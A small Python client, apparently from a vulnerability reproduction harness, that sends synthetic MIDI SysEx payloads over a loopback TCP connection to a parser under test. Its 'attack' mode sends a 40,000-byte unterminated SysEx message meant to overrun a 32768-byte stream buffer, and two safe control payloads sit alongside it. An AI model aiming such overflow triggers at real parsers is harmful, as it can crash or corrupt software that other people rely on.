#!/usr/bin/env python3
"""Send one synthetic wire payload to the W171 loopback consumer.

attack:   0xF0 + 40000 * 0x6A (one unterminated SysEx, no 0xF7).
safe:     0xF0 + 998 * 0x6A + 0xF7 (short, terminated SysEx).
safe-fit: 0xF0 + 32767 * 0x6A (unterminated, exactly fills the grown
          32768-byte streamBuffer so the victim exists but is untouched).

Each payload goes out on one loopback connection followed by SHUT_WR, so the
consumer reads one block and calls parseStream once.
"""
import socket
import sys


def main():
    if len(sys.argv) != 4:
        print("usage: wire_client.py HOST PORT attack|safe|safe-fit", file=sys.stderr)
        return 2
    host, port, kind = sys.argv[1], int(sys.argv[2]), sys.argv[3]
    if kind == "attack":
        payload = b"\xf0" + b"\x6a" * 40000
    elif kind == "safe":
        payload = b"\xf0" + b"\x6a" * 998 + b"\xf7"
    elif kind == "safe-fit":
        payload = b"\xf0" + b"\x6a" * 32767
    else:
        print("unknown payload kind: " + kind, file=sys.stderr)
        return 2
    with socket.create_connection((host, port), timeout=5) as sock:
        sock.sendall(payload)
        sock.shutdown(socket.SHUT_WR)
    print("sent=%s bytes=%d host=%s port=%d" % (kind, len(payload), host, port))
    return 0


if __name__ == "__main__":
    sys.exit(main())
